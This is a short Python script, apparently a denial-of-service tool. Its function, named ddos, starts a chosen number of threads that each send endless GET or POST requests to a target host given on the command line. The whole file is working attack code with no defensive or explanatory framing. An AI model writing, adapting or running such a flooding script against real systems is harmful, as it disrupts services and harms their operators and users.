import sys
import requests
from threading import Thread

host = sys.argv[1]
print(host)
port = int(sys.argv[2])
threads = int(sys.argv[3])
data_exists = False
if len(sys.argv) > 4:
    data = sys.argv[4]
    data_exists = True


def ddos():
    try:
        while True:
            if data_exists:
                r = requests.post(url=host, json=data)
            else:
                r = requests.get(url=host)
            print(r.text)
    except KeyboardInterrupt:
        print("stopped on Keyboard Interrupt")
        pass


for i in range(threads):
    t = Thread(target=ddos)
    t.start()
